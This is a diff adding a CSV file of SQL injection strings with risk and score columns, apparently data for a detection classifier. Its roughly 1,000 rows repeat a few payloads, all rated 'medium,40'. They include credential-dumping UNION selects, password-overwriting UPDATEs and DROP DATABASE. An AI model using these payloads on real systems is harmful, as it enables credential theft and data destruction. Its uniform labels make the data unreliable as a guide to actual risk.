@@ -1,0 +1,1001 @@
+query,risk,score
+"' UNION SELECT username, password FROM users --",medium,40
+'; SELECT @@version --,medium,40
+' OR username LIKE '%admin%' --,medium,40
+' OR username LIKE '%admin%' --,medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+' or 1=1 in (select * from users) --,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+'; SELECT @@version --,medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+'; UPDATE users SET password='pass',medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+'; UPDATE users SET password='pass',medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+' HAVING 1=1 #,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+' or 1=1 in (select * from users) --,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+'; SELECT @@version --,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+'; UPDATE users SET password='pass',medium,40
+' HAVING 1=1 #,medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+' or 1=1 in (select * from users) --,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+' or 1=1 in (select * from users) --,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+'; UPDATE users SET password='pass',medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+' OR username LIKE '%admin%' --,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+'; SELECT @@version --,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+' OR username LIKE '%admin%' --,medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+' OR username LIKE '%admin%' --,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+'; DROP DATABASE temp --,medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+' OR username LIKE '%admin%' --,medium,40
+' HAVING 1=1 #,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+' OR username LIKE '%admin%' --,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+'; DROP DATABASE temp --,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+'; UPDATE users SET password='pass',medium,40
+' HAVING 1=1 #,medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+' HAVING 1=1 #,medium,40
+' or 1=1 in (select * from users) --,medium,40
+' or 1=1 in (select * from users) --,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+' HAVING 1=1 #,medium,40
+'; DROP DATABASE temp --,medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+'; UPDATE users SET password='pass',medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+'; UPDATE users SET password='pass',medium,40
+' HAVING 1=1 #,medium,40
+'; UPDATE users SET password='pass',medium,40
+' HAVING 1=1 #,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+'; DROP DATABASE temp --,medium,40
+' HAVING 1=1 #,medium,40
+'; SELECT @@version --,medium,40
+' OR username LIKE '%admin%' --,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+'; DROP DATABASE temp --,medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+'; SELECT @@version --,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+' OR username LIKE '%admin%' --,medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+' HAVING 1=1 #,medium,40
+'; SELECT @@version --,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+'; DROP DATABASE temp --,medium,40
+' OR username LIKE '%admin%' --,medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+'; UPDATE users SET password='pass',medium,40
+'; UPDATE users SET password='pass',medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+' HAVING 1=1 #,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+' HAVING 1=1 #,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+'; SELECT @@version --,medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+'; SELECT @@version --,medium,40
+'; UPDATE users SET password='pass',medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+' or 1=1 in (select * from users) --,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+'; DROP DATABASE temp --,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+' HAVING 1=1 #,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+' OR username LIKE '%admin%' --,medium,40
+'; UPDATE users SET password='pass',medium,40
+'; SELECT @@version --,medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+'; DROP DATABASE temp --,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+' HAVING 1=1 #,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+'; SELECT @@version --,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+'; SELECT @@version --,medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+' HAVING 1=1 #,medium,40
+'; DROP DATABASE temp --,medium,40
+' HAVING 1=1 #,medium,40
+'; SELECT @@version --,medium,40
+' OR username LIKE '%admin%' --,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+' or 1=1 in (select * from users) --,medium,40
+'; UPDATE users SET password='pass',medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+' HAVING 1=1 #,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+'; UPDATE users SET password='pass',medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+'; SELECT @@version --,medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+'; SELECT @@version --,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+'; DROP DATABASE temp --,medium,40
+'; SELECT @@version --,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+' HAVING 1=1 #,medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+' or 1=1 in (select * from users) --,medium,40
+' OR username LIKE '%admin%' --,medium,40
+' HAVING 1=1 #,medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+' OR username LIKE '%admin%' --,medium,40
+' or 1=1 in (select * from users) --,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+' HAVING 1=1 #,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+'; DROP DATABASE temp --,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+'; DROP DATABASE temp --,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+' or 1=1 in (select * from users) --,medium,40
+' or 1=1 in (select * from users) --,medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+' HAVING 1=1 #,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+'; DROP DATABASE temp --,medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+' OR username LIKE '%admin%' --,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+'; UPDATE users SET password='pass',medium,40
+'; SELECT @@version --,medium,40
+' HAVING 1=1 #,medium,40
+'; SELECT @@version --,medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+'; DROP DATABASE temp --,medium,40
+'; DROP DATABASE temp --,medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+'; DROP DATABASE temp --,medium,40
+' or 1=1 in (select * from users) --,medium,40
+'; UPDATE users SET password='pass',medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+' or 1=1 in (select * from users) --,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+'; UPDATE users SET password='pass',medium,40
+' OR username LIKE '%admin%' --,medium,40
+' HAVING 1=1 #,medium,40
+' HAVING 1=1 #,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+'; UPDATE users SET password='pass',medium,40
+'; UPDATE users SET password='pass',medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+'; UPDATE users SET password='pass',medium,40
+'; SELECT @@version --,medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+'; DROP DATABASE temp --,medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+'; SELECT @@version --,medium,40
+'; UPDATE users SET password='pass',medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+'; SELECT @@version --,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+' OR username LIKE '%admin%' --,medium,40
+'; UPDATE users SET password='pass',medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+' or 1=1 in (select * from users) --,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+'; DROP DATABASE temp --,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+'; SELECT COUNT(*) FROM users --,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+' HAVING 1=1 #,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+'; UPDATE users SET password='pass',medium,40
+' OR username LIKE '%admin%' --,medium,40
+' or 1=1 in (select * from users) --,medium,40
+'; DROP DATABASE temp --,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+1' OR '1' = '1' GROUP BY 1 --,medium,40
+1' OR 1=1; SELECT * FROM users --,medium,40
+'; UPDATE users SET password='pass',medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+' or 1=1 in (select * from users) --,medium,40
+'; SELECT @@version --,medium,40
+"' OR '1'='1' UNION SELECT 1,2 --",medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 --",medium,40
+'; DROP DATABASE temp --,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+' OR username LIKE '%admin%' --,medium,40
+' HAVING 1=1 #,medium,40
+' OR username LIKE '%admin%' --,medium,40
+'; UPDATE users SET password='pass',medium,40
+' UNION SELECT * FROM information_schema.tables --,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+' HAVING 1=1 #,medium,40
+'; SELECT @@version --,medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+'; SELECT @@version --,medium,40
+' or 1=1 in (select * from users) --,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+' OR username LIKE '%admin%' --,medium,40
+"' UNION SELECT username, password FROM users --",medium,40
+' or 1 = 1 LIMIT 1 --,medium,40
+"' UNION ALL SELECT 1,2 FROM users --",medium,40
+'; UPDATE users SET password='pass',medium,40
+' or 1=1 in (select * from users) --,medium,40
+' HAVING 1=1 #,medium,40
+' or 1=1 in (select * from users) --,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+' HAVING 1=1 # -- ,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+1' OR 1=1; SELECT * FROM users -- -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+'; SELECT @@version -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+1' OR 1=1; SELECT * FROM users -- -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+1' OR 1=1; SELECT * FROM users -- -- ,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+' HAVING 1=1 # -- ,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+' HAVING 1=1 # -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+' HAVING 1=1 # -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+' HAVING 1=1 # -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+1' OR 1=1; SELECT * FROM users -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+1' OR 1=1; SELECT * FROM users -- -- ,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+1' OR 1=1; SELECT * FROM users -- -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+'; SELECT @@version -- -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+' HAVING 1=1 # -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+' HAVING 1=1 # -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+' HAVING 1=1 # -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
+1' OR 1=1; SELECT * FROM users -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+'; SELECT @@version -- -- ,medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+1' OR 1=1; SELECT * FROM users -- -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+' HAVING 1=1 # -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+' HAVING 1=1 # -- ,medium,40
+' HAVING 1=1 # -- ,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+1' OR 1=1; SELECT * FROM users -- -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
+1' OR 1=1; SELECT * FROM users -- -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+1' OR 1=1; SELECT * FROM users -- -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+1' OR 1=1; SELECT * FROM users -- -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+' HAVING 1=1 # -- ,medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+' HAVING 1=1 # -- ,medium,40
+"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+'; DROP DATABASE temp -- -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+' OR username LIKE '%admin%' -- -- ,medium,40
+'; UPDATE users SET password='pass' -- ,medium,40
+'; SELECT @@version -- -- ,medium,40
+'; SELECT COUNT(*) FROM users -- -- ,medium,40
+' or 1 = 1 LIMIT 1 -- -- ,medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+"' UNION SELECT username, password FROM users -- -- ",medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+' or 1=1 in (select * from users) -- -- ,medium,40
+' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
